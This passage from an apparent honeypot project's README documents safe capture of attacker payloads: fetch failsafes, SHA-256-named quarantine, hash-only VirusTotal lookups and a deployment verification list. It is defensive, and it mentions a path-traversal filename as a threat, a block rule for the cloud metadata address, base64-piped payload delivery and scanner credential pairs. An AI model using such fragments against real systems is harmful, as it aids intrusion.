**Optionally**, the `intel` container will go and fetch the file:

```bash
# .env
FETCH_ENABLED=true
```

That is off by default and should stay off until you have decided three things.
Your address contacts theirs, and a loader host that sees a fetch from a machine
it just "infected" learns it found a honeypot. They choose what you receive.
And you will be storing live malware, which is a conversation to have with your
provider before the samples arrive rather than after ([§2.1](AUTHORIZATION.md)).

No honeypot gains a route out either way. They write the IOC to the shared
volume; `intel` — already the only container with egress, and on no network any
honeypot can reach — reads it. Failsafes fire in this order:

| | |
|---|---|
| `FETCH_ENABLED` | Off by default |
| Scheme allowlist | `http`/`https` only. tftp and ftp are recorded, never fetched |
| Resolution | Done in the fetcher, not trusted from the record |
| Address check | **Every** resolved address must be publicly routable — one answer pointing at `169.254.169.254` refuses the whole fetch |
| Redirects | Refused, not followed |
| Timeout | `FETCH_TIMEOUT`, default 8s |
| Size cap | `FETCH_MAX_BYTES`, enforced while streaming, so a lying `Content-Length` changes nothing |
| Per-host cooldown | `FETCH_HOST_COOLDOWN`, default 1h |
| Rate limit | `FETCH_MAX_PER_HOUR`, default 20 |
| Circuit breaker | Ten consecutive failures stops fetching entirely |
| Storage cap | `loot.capture` refuses past `MAX_TOTAL_MB` |
| At rest | Mode 0400, `.bin` suffix, never executed |

Anything captured flows into the existing VirusTotal hash lookup unchanged.

### The path a payload takes

```
attacker drops a file
   │
   ├─ SFTP put ────────────► QuarantineHandle   (ssh-honey)
   └─ shell redirect ──────► _write_file         (any fake shell)
                                   │
                                   ▼
                        shared/loot.py: capture()
                        hash → dedupe → size check → write
                                   │
                                   ▼
              storage/loot/<sha256>.bin    the bytes, 0400
              storage/loot/<sha256>.json   metadata + sightings
                                   │
                                   ▼  (filesystem, never a socket)
                        intel container, on cam-egress
                        reads the .json and the filename only
                                   │
                                   ▼
                        VirusTotal hash lookup → verdict
                        written back into the .json, alert on hit
```

Two capture routes, because attackers use both. SFTP is the obvious one.
The other matters more in practice: a payload delivered as a heredoc or a
base64 blob piped through `base64 -d` never touches SFTP, so the shell write is
often the only copy you get.

### Why it is safe to have on the box

- **Content-addressed.** The filename is the SHA-256 of the content. Their
  filename is recorded as metadata and never used to build a path. This is the
  one that matters most — otherwise a filename of `../../etc/cron.d/x` is a
  real write primitive.
- **Never executable.** Files land `0400`, the directory `0700`, on no PATH and
  under no document root. nginx already refuses everything under `storage/`.
- **Nothing parses it.** Bytes and a hash. The moment a honeypot starts
  *understanding* attacker input it inherits the attack surface of whatever
  library does the understanding.
- **Bounded.** Per-file and total caps checked before writing, and the SFTP
  handler buffers to the same limit, so neither the file nor the buffer becomes
  a way to fill your disk on purpose.
- **Deduplicated.** The same payload from fifty hosts is one file and fifty
  sightings — which is also the more useful shape for "who else dropped this".

The intel container is the only one with internet access, and **it never opens
a sample.** It reads the JSON sidecars and the hash in the filename; the bytes
are hashed at capture time inside a container with no route out. So attacker
bytes and the internet route never meet in the same process.

### Reading your loot

```bash
ls -la storage/loot/                        # hashes, sizes, timestamps
jq . storage/loot/<sha256>.json             # sightings and scan verdict
jq -r 'select(.scan.malicious > 0)
       | "\(.sha256[0:16]) \(.scan.malicious) \(.scan.label)"' \
   storage/loot/*.json                      # everything flagged
jq -r 'select(.scan.known == false) | .sha256' storage/loot/*.json   # unknown to VT
```

A sidecar looks like this:

```json
{
  "sha256": "9f2c…", "size": 4211,
  "first_seen": "2026-07-28T16:35:55+00:00",
  "sighting_count": 3,
  "sightings": [{"at": "…", "ip": "195.178.110.228", "service": "ssh",
                 "origin": "sftp-put", "filename": "/tmp/.x/redis.sh"}],
  "scan": {"known": true, "malicious": 41, "label": "trojan.xmrig/miner"}
}
```

### VirusTotal: it sends a hash, never the file

Set `VT_API_KEY` and the intel container looks each sample up. Leave it empty
and quarantine still works — you just do not get verdicts.

The hash-not-file distinction is worth understanding before you change it.
VirusTotal redistributes submitted samples to its paying customers, and that
market includes the people who write the malware; monitoring VT for your own
payloads is standard practice. Uploading a targeted implant tells its operator
it was caught and roughly when, can publish whatever the binary embeds — a
hardcoded C2, a victim identifier, credentials that are not yours to disclose —
and burns the visibility you were collecting. For commodity botnet junk none of
that matters and the hash is already known. Submit by hand if and when you have
decided it is safe.

**"Unknown to VirusTotal" is the interesting verdict, not the boring one.**
Nobody has submitted it, which for a live drop means new or targeted. That
alerts as `LOOT_UNKNOWN`.

Free-tier keys allow 4 requests/minute and 500/day; `VT_REQUEST_INTERVAL`
defaults to 20 seconds to stay well inside that.

### What is deliberately not here

Detonation. Copy the hash-named file to a machine you are willing to lose.
Running attacker code on the box that is taking the attacks defeats the point
of every other control in this repository.

## Requirements

Ubuntu 22.04/24.04, Docker 24+ with Compose v2, 2 vCPU / 4 GB / 40 GB, a domain
on Cloudflare, and a VPS dedicated entirely to this.

## Verification status

Running on a live VPS taking real internet traffic. Confirmed in production:

- Containment, in both directions. `smoke-test.sh` asserts that honeypot
  containers cannot reach the internet and that `session-cam` can.
- Session recording end to end, including the login, from real attacker
  sessions rather than synthetic input.
- The tarpit. One source accumulated 79 holds averaging ~63 seconds; the
  aggregate lands around 2,200 attacker-minutes per day at roughly 1.6
  concurrent holds, with the HTTP tarpit contributing about 60%. Those figures
  predate withholding the SSH version string, which removed the protocol error
  that had been ending SSH holds at about 38 seconds regardless of the
  configured ceiling.
- Ban and tarpit thresholds, after recalibration against real scanner volume.
- The credential policy, against a live accept-all probe: `charles:charles`
  followed by `345gs5662d34:345gs5662d34`, where accepting both had ended the
  engagement 2.8 seconds later.
- The dashboard, stats, day-scoping and the attack map.
- Daily history and lifetime totals. The event log is one file per UTC day and
  past days recompute from their own file, so the day picker walks the whole
  retention window.
- Session playback, including stitching an attacker's reconnections onto one
  timeline, and watching a session while it is still being written.
- Evidence bundles, per attacker and in bulk.
- Recording on every service, SMB and RDP included — those two are binary
  protocols, so their recordings are a written account of the negotiation
  rather than a terminal replay.
- Sortable tables, including IP columns ordered by octet.

Not yet confirmed in production, because they are recent: the persona layer,
payload quarantine and VirusTotal enrichment, scan-back, and the two fixes that
stop worms disconnecting early (`bash -c` unwrapping and pipelined input).
Watch `docker compose logs -f intel` and your loot directory after deploying
those, and run `./deploy/preflight.sh` first — it catches the import and syntax
faults that otherwise surface as a restart loop.

Nothing here has been through an external audit.
